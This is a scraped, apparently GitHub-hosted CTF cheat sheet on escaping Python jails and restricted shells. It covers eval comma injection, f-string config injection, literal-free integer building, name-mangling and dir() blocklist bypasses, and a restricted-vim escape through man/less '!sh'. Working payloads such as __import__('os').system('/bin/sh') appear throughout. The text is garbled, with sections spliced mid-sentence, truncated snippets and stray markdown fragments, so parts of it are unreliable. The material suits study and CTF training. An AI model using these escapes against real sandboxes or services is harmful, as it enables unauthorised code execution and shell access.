data-snippet-clipboard-copy-content=\"def find_char(i):\n    lo, hi = 32, 127\n    while lo \u0026lt; hi:\n        mid = (lo + hi) // 2\n        cmp = query(i, mid)\n        if cmp == 0:\n            return chr(mid)\n        elif cmp == -1:  # mid \u0026lt; flag[i]\n            lo = mid + 1\n        else:\n            hi = mid - 1\n    return chr(lo)\n\nflag_len = int(test(\u0026quot;L()\u0026quot;))\nflag = ''.join(find_char(i) for i in range(flag_len))\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via \u003ccode\u003elong_to_bytes()\u003c/code\u003e. On the second unrestricted prompt, run \u003ccode\u003eopen('/flag.txt').read()\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eDetection:\u003c/strong\u003e Challenge restricts input character set to exactly 2 characters. + user_input + \u0026quot;()\u0026quot;)\n# Inject: dig(),eval(eval('raw\\x5finput()')),\n# Becomes: eval(\u0026quot;your.dig(),eval(eval('raw\\x5finput()')),()\u0026quot;) \n# = tuple of (your.dig(), eval(arbitrary), None)\n\n# Alternative: inject payload via Name variable during registration\n# Name = \u0026quot;__import__('os').system('/bin/sh')\u0026quot;\n# Input: dig(),eval(name),exit\n# eval(\u0026quot;your.dig(),eval(name),exit()\u0026quot;) -\u0026gt; executes payload from name\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e# Server code: eval(\"your.\" + user_input + \"()\")\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# Inject: dig(),eval(eval('raw\\x5finput()')),\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# Becomes: eval(\"your.dig(),eval(eval('raw\\x5finput()')),()\") \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# = tuple of (your.dig(), eval(arbitrary), None)\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e# Alternative: inject payload via Name variable during registration\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# Name = \"__import__('os').system('/bin/sh')\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# Input: dig(),eval(name),exit\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# eval(\"your.dig(),eval(name),exit()\") -\u0026gt; executes payload from name\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Python \u003ccode\u003eeval()\u003c/code\u003e on a comma-separated expression creates a tuple, allowing multiple expressions to execute. \u003ccode\u003e\\x5f\u003c/code\u003e hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via \u003ccode\u003eeval(varname)\u003c/code\u003e in the eval context. The general pattern: if the server wraps your input in \u003ccode\u003eeval(\"prefix\" + input + \"suffix\")\u003c/code\u003e, use commas to break out of the intended expression and inject additional expressions as tuple elements.\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePython f-string Config Injection via Stored eval (INShAck 2018)\u003c/h2\u003e\u003ca id=\"user-content-python-f-string-config-injection-via-stored-eval-inshack-2018\" class=\"anchor\" aria-label=\"Permalink: Python f-string Config Injection via Stored eval (INShAck 2018)\" href=\"#python-f-string-config-injection-via-stored-eval-inshack-2018\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePattern:\u003c/strong\u003e A config creator uses Python f-strings to render values. Store a payload as one config value, then reference it from another using eval(). Register key \"a\" with value \u003ccode\u003e__import__(\"os\").system(\"cat flag\")\u003c/code\u003e, then key \"eval(a)\" with value \"{}\".\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Step 1: Store payload as config value\nregister_key(\u0026quot;a\u0026quot;, '__import__(\u0026quot;os\u0026quot;).system(\u0026quot;cat flag.txt\u0026quot;)')\n\n# Step 2: Create key whose name is eval(a) with empty format placeholder\nregister_key(\u0026quot;eval(a)\u0026quot;, \u0026quot;{}\u0026quot;)\n\n# Step 3: When config renders f\u0026quot;eval(a) = {value}\u0026quot;,\n# the f-string evaluates eval(a) in the key position,\n# executing the stored payload\nshow_config()  # triggers f-string rendering -\u0026gt; RCE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e# Step 1: Store payload as config value\u003c/span\u003e\n\u003cspan class=\"pl-en\"\u003eregister_key\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"a\"\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e'__import__(\"os\").system(\"cat flag.txt\")'\u003c/span\u003e)\n\n\u003cspan class=\"pl-c\"\u003e# Step 2: Create key whose name is eval(a) with empty format placeholder\u003c/span\u003e\n\u003cspan class=\"pl-en\"\u003eregister_key\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"eval(a)\"\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\"{}\"\u003c/span\u003e)\n\n\u003cspan class=\"pl-c\"\u003e# Step 3: When config renders f\"eval(a) = {value}\",\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# the f-string evaluates eval(a) in the key position,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e# executing the stored payload\u003c/span\u003e\n\u003cspan class=\"pl-en\"\u003eshow_config\u003c/span\u003e()  \u003cspan class=\"pl-c\"\u003e# triggers f-string rendering -\u0026gt; RCE\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Python f-strings evaluate expressions in curly braces at render time. If config keys or values are rendered in f-strings, storing \u003ccode\u003eeval(stored_key)\u003c/code\u003e as a key name causes arbitrary code execution when the config is displayed. Two-step: store payload as value, reference via eval in key name.\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePattern:\u003c/strong\u003e Generate arbitrary integers using only \u003ccode\u003e~\u003c/code\u003e (bitwise NOT), \u003ccode\u003e\u0026lt;\u0026lt;\u003c/code\u003e (left shift), \u003ccode\u003e[]\u0026lt;[]\u003c/code\u003e (False=0), and \u003ccode\u003e{}\u0026lt;[]\u003c/code\u003e (True=1) when numeric literals are forbidden.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"def brainfuckize(nb):\n    \u0026quot;\u0026quot;\u0026quot;Convert integer to expression using only ~, \u0026lt;\u0026lt;, \u0026lt;, [], {}\u0026quot;\u0026quot;\u0026quot;\n    if nb == -2: return \u0026quot;~({}\u0026lt;[])\u0026quot;    # ~True = -2\n    if nb == -1: return \u0026quot;~([]\u0026lt;[])\u0026quot;    # ~False = -1\n    if nb == 0:  return \u0026quot;([]\u0026lt;[])\u0026quot;     # False = 0\n    if nb == 1:  return \u0026quot;({}\u0026lt;[])\u0026quot;     # True = 1\n    if nb % 2:   return f\u0026quot;~{brainfuckize(~nb)}\u0026quot;  # Odd: ~(complement)\n    return f\u0026quot;({brainfuckize(nb//2)}\u0026lt;\u0026lt;({{}}\u0026lt;[]))\u0026quot;   # Even: half \u0026lt;\u0026lt; 1\n\n# brainfuckize(65) → \u0026quot;(~(~([]\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026lt;\u0026lt;({}\u0026lt;[]))\u0026quot;\n# Then use: \u0026quot;%c\u0026quot; % 65 → \u0026quot;A\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ebrainfuckize\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003enb\u003c/span\u003e):\n    \u003cspan class=\"pl-s\"\u003e\"\"\"Convert integer to expression using only ~, \u0026lt;\u0026lt;, \u0026lt;, [], {}\"\"\"\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enb\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e2\u003c/span\u003e: \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"~({}\u0026lt;[])\"\u003c/span\u003e    \u003cspan class=\"pl-c\"\u003e# ~True = -2\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enb\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e: \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"~([]\u0026lt;[])\"\u003c/span\u003e    \u003cspan class=\"pl-c\"\u003e# ~False = -1\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003enb\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e==\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e:  \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"([]\u0026lt;[])\"\u003c/span\u003e     \u003cspan class=\"pl-c\"\u003e# Then use: \"%c\" % 65 → \"A\"\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Combine with \u003ccode\u003e\"%c\" % ascii_value\u003c/code\u003e to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePython Name Mangling and Attribute Access (Tokyo Westerns 2017)\u003c/h2\u003e\u003ca id=\"user-content-python-name-mangling-and-attribute-access-tokyo-westerns-2017\" class=\"anchor\" aria-label=\"Permalink: Python Name Mangling and Attribute Access (Tokyo Westerns 2017)\" href=\"#python-name-mangling-and-attribute-access-tokyo-westerns-2017\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThree sandbox escape vectors that exploit Python's name visibility model.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e1. Name mangling bypass:\u003c/strong\u003e Python \"private\" \u003ccode\u003e__method\u003c/code\u003e names in a class are stored as \u003ccode\u003e_ClassName__method\u003c/code\u003e. They are accessible via \u003ccode\u003edir()\u003c/code\u003e and \u003ccode\u003egetattr()\u003c/code\u003e — not truly private.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Name mangling bypass\ngetattr(obj, dir(obj)[0])()  # calls _ClassName__method\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e# Name mangling bypass\u003c/span\u003e\n\u003cspan class=\"pl-en\"\u003egetattr\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eobj\u003c/span\u003e, \u003cspan class=\"pl-en\"\u003edir\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eobj\u003c/span\u003e)[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e])()  \u003cspan class=\"pl-c\"\u003e# calls _ClassName__method\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e2. Function constant leakage:\u003c/strong\u003e All string literals inside a function body are stored in \u003ccode\u003efunc_code.co_consts\u003c/code\u003e (Python 2) or \u003ccode\u003e__code__.co_consts\u003c/code\u003e (Python 3) and are readable from outside.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# func_code local variable leak (Python 2)\nfunc.func_code.co_consts  # reveals all string literals in function\n\n# Python 3 equivalent\nfunc.__code__.co_consts\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e# func_code local variable leak (Python 2)\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003efunc\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003efunc_code\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eco_consts\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# reveals all string literals in function\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e# Python 3 equivalent\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003efunc\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e__code__\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eco_consts\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e3. Module docstring as data store:\u003c/strong\u003e Module-level triple-quoted strings become \u003ccode\u003emodule.__doc__\u003c/code\u003e, readable without needing file access.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Module docstring access\nimport target_module\ntarget_module.__doc__  # reads module-level triple-quoted string\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e# Module docstring access\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003etarget_module\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003etarget_module\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003e__doc__\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e# reads module-level triple-quoted string\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Python \u003ccode\u003e__\u003c/code\u003e prefix is name-mangled, not truly private — \u003ccode\u003edir(obj)\u003c/code\u003e + \u003ccode\u003egetattr()\u003c/code\u003e bypass it. \u003ccode\u003efunc_code.co_consts\u003c/code\u003e exposes all literal constants defined inside a function. Module docstrings are always readable as \u003ccode\u003e__doc__\u003c/code\u003e without file access.\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eMulti-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)\u003c/h2\u003e\u003ca id=\"user-content-multi-stage-payload-with-class-attribute-persistence-plaidctf-2013\" class=\"anchor\" aria-label=\"Permalink: Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)\" href=\"#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePattern:\u003c/strong\u003e Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Stage 1: Store code fragment on a subclass\n().__class__.__base__.__subclasses__()[-2].payload = \u0026quot;import os; If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use \u003ccode\u003eIncrementalDecoder\u003c/code\u003e or any persistent subclass as the storage target.\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eRestricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)\u003c/h2\u003e\u003ca id=\"user-content-restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018\" class=\"anchor\" aria-label=\"Permalink: Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)\" href=\"#restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePattern (shrine):\u003c/strong\u003e Sandbox launches a locked-down \u003ccode\u003evim\u003c/code\u003e with \u003ccode\u003e:shell\u003c/code\u003e/\u003ccode\u003e:!\u003c/code\u003e mapped out and a secure-mode profile. Command-mode escapes are blocked, but normal-mode \u003ccode\u003eK\u003c/code\u003e (look up keyword under cursor via \u003ccode\u003ekeywordprg\u003c/code\u003e, default \u003ccode\u003eman\u003c/code\u003e) still works. \u003ccode\u003eman\u003c/code\u003e internally paginates via \u003ccode\u003eless\u003c/code\u003e, and \u003ccode\u003eless\u003c/code\u003e itself has a documented shell-escape: typing \u003ccode\u003e!sh\u003c/code\u003e from the pager spawns a shell with the user's real privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eExploit steps:\u003c/strong\u003e\u003c/p\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eOpen any file in the restricted vim (or create one inline with \u003ccode\u003evim -c 'new' -c 'put! =\\\"ls\\\"'\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eIn normal mode, place the cursor on any identifier and press \u003ccode\u003eK\u003c/code\u003e. vim runs \u003ccode\u003eman \u0026lt;word\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eman\u003c/code\u003e pipes output to \u003ccode\u003eless\u003c/code\u003e. Inside \u003ccode\u003eless\u003c/code\u003e, press \u003ccode\u003e!sh\u003c/code\u003e and hit Enter — the pager fork/execs a real shell.\u003c/li\u003e\n\u003cli\u003eAlternatively, once inside \u003ccode\u003eless\u003c/code\u003e type \u003ccode\u003ev\u003c/code\u003e to launch \u003ccode\u003e$EDITOR\u003c/code\u003e; if \u003ccode\u003eEDITOR=vim\u003c/code\u003e is unset the default editor still allows shell escape via \u003ccode\u003e:!\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"vim file.txt        # restricted vim opens\n(cursor on \u0026quot;ls\u0026quot;)\nK                   # runs `man ls` → pager `less`\n!sh                 # less shell-escape → real shell\"\u003e\u003cpre lang=\"text\" class=\"notranslate\"\u003e\u003ccode\u003evim file.txt        # restricted vim opens\n(cursor on \"ls\")\nK                   # runs `man ls` → pager `less`\n!sh                 # less shell-escape → real shell\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eHardening signals to check first:\u003c/strong\u003e \u003ccode\u003ekeywordprg\u003c/code\u003e value (\u003ccode\u003e:set keywordprg?\u003c/code\u003e), \u003ccode\u003esecure\u003c/code\u003e mode, whether \u003ccode\u003eshell\u003c/code\u003e option has been cleared, and the \u003ccode\u003eLESSSECURE=1\u003c/code\u003e environment variable. \u003ccode\u003eLESSSECURE=1\u003c/code\u003e specifically disables \u003ccode\u003e!\u003c/code\u003e, \u003ccode\u003e|\u003c/code\u003e, \u003ccode\u003ev\u003c/code\u003e, and \u003ccode\u003es\u003c/code\u003e inside \u003ccode\u003eless\u003c/code\u003e — its absence is a green light for this escape.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eKey insight:\u003c/strong\u003e Restricted editors almost always leak via chained pagers and keyword lookups. Catalog every command that spawns a child process (\u003ccode\u003eK\u003c/code\u003e/\u003ccode\u003ekeywordprg\u003c/code\u003e, \u003ccode\u003e:grep\u003c/code\u003e, \u003ccode\u003e:make\u003c/code\u003e, \u003ccode\u003egx\u003c/code\u003e for URL open, \u003ccode\u003e:Man\u003c/code\u003e) before touching \u003ccode\u003e:!\u003c/code\u003e. If even one child process uses \u003ccode\u003eless\u003c/code\u003e or another escape-friendly pager without \u003ccode\u003eLESSSECURE=1\u003c/code\u003e, you have a shell.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eReferences:\u003c/strong\u003e TokyoWesterns CTF 4th 2018 — writeup 10859; GTFOBins \u003ccode\u003evim\u003c/code\u003e/\u003ccode\u003eless\u003c/code\u003e/\u003ccode\u003eman\u003c/code\u003e entries\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003edir() Attribute Lookup Escape Bypassing \u003cstrong\u003eclass\u003c/strong\u003e Blocklist (InCTF 2018)\u003c/h2\u003e\u003ca id=\"user-content-dir-attribute-lookup-escape-bypassing-class-blocklist-inctf-2018\" class=\"anchor\" aria-label=\"Permalink: dir() Attribute Lookup Escape Bypassing class Blocklist (InCTF 2018)\" href=\"#dir-attribute-lookup-escape-bypassing-class-blocklist-inctf-2018\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePattern:\u003c/strong\u003e A sandbox substring-filters literal strings \u003ccode\u003e__class__\u003c/code\u003e, \u003ccode\u003e__bases__\u003c/code\u003e, \u003ccode\u003e__subclasses__\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e, and \u003ccode\u003eimport\u003c/code\u003e, but \u003ccode\u003edir(obj)\u003c/code\u003e is allowed and returns the attribute names as strings. Use \u003ccode\u003edir([])\u003c/code\u003e to look up forbidden attribute names by index, then chain \u003ccode\u003egetattr\u003c/code\u003e calls to reach \u003ccode\u003eobject.__subclasses__()\u003c/code\u003e without ever typing the blocked literals.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative dir([]) == ['__add__', '__class__', '__contains__', ...]\ni_class = 1\nbase_attr = 34           # index of \u0026quot;__subclasses__\u0026quot; in dir(getattr([], dir([])[1]))\n\n# Step 2: chain \u003cem\u003edata\u003c/em\u003e function: it returns plain strings. A substring blocklist scanning the source never sees the blocked words because they are generated at runtime from attribute table bytes. Any Python jail that filters source text without AST walking is defeated by one layer of indirection — \u003ccode\u003edir\u003c/code\u003e, \u003ccode\u003eglobals().get(key)\u003c/code\u003e, or \u003ccode\u003evars(obj)[key]\u003c/code\u003e. When auditing a jail, always ask: \"does the filter see the literal or the \u003cem\u003evalue\u003c/em\u003e?\". If it only sees the literal, \u003ccode\u003edir()\u003c/code\u003e indexing is the shortest escape.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eReferences:\u003c/strong\u003e InCTF [Python f-string Config Injection via Stored eval (INShAck 2018)](#python-f-string-config-injection-via-stored-eval-inshack-2018)","- [Hints Cheat Sheet](#hints-cheat-sheet)","","---","","## Identifying Jail Type","","**Error patterns reveal filtering:**","","| Error Pattern | Meaning | Approach |","|---------------|---------|----------|","| `name not allowed: X` | Identifier blacklist | Unicode, hex escapes |","| `unknown function: X` | Function whitelist | Brute-force names |","| `node not allowed: X` | AST filtering | Avoid blocked syntax |","| `binop types must be int/bool` | Type restrictions | Use int operations |","","---","","## Systematic Enumeration","","### Test Basic Features","```python","tests = [","    (\"1+1\", \"arithmetic\"),","    (\"True\", \"booleans\"),","    (\"'hello'\", \"string literals\"),","    (\"'\\\\x41'\", \"hex escapes\"),","    (\"1==1\", \"comparison\"),","]","```","","### Test Blocked AST Nodes","```python","blocked_tests = [","    (\"'a'+'b'\", \"string concat\"),","    (\"'ab'[0]\", \"indexing\"),","    (\"''.join\", \"attribute access\"),","    (\"[1,2]\", \"lists\"),","    (\"lambda:1\", \"lambdas\"),","]","```","","### Brute-Force Function 